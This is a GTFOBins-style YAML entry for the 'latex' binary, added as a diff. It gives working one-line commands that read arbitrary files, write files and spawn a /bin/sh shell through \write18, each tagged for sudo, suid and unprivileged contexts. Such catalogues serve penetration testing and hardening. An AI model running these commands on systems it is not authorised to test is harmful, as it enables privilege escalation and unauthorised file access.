@@ -1,0 +1,31 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/latex -->
+---
+functions:
+  file-read:
+  - code: |-
+      latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+      strings texput.dvi
+    comment: |-
+      The read file will be part of the PDF output.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+    comment: |-
+      The file can only be written in the current directory, and the `.tex` extension is mandatory.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      latex --shell-escape '\immediate\write18{/bin/sh}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
